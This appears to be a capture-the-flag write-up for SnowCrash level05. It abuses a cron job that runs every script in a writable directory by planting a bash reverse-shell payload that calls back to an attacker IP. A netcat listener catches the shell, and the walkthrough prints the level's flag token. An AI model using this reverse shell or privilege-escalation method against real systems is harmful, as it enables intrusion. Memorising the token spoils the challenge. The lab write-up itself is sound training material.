- In the environment variables we discover the `MAIL` location hosts a file which looks like a cronjob which executes `openareaserver` as `flag05` in a bash subprocess

```
level05@SnowCrash:/$ ls -la $MAIL
-rw-r--r--+ 1 root mail 58 Sep 18 16:08 /var/mail/level05
level05@SnowCrash:/$ file /var/mail/level05 
/var/mail/level05: ASCII text
level05@SnowCrash:/$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```

- Examining the script `/usr/sbin/openarenaserver` reveals a potential wildcard " * " exploit where all scripts in `/opt/openarenaserver/` directory are executed and removed after

```
level05@SnowCrash:/opt/openarenaserver$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

```

- We prepare a malicious file in the `/opt/openareaserver/` directory and use a payload `/bin/sh -i >& /dev/tcp/<attackIP>/<port> 0>&1` to establish a reverse shell back to the attacked machine

```
level05@SnowCrash:/opt/openarenaserver$ vim malicious.sh
level05@SnowCrash:/opt/openarenaserver$ chmod +x malicious.sh
level05@SnowCrash:/opt/openarenaserver$ cat malicious.sh
#!/bin/bash
/bin/sh -i >& /dev/tcp/10.13.200.129/4444 0>&1
```

- On our attack machine we start a netcat listener on port 4444 and wait for the cronjob to execute the malicous script which creates a reverse shell as the user `flag05`

```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.200.129] from (UNKNOWN) [10.13.200.131] 42312
/bin/sh: 0: can't access tty; job control turned off
$ whoami
flag05
```

- We run the `getflag` command to retrieve the flag
```
$ whoami
flag05
$ getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

- Authenticate as user `level06` using the token

```
level05@SnowCrash:/opt/openarenaserver$ su level06
Password: 
level06@SnowCrash:~$ 
```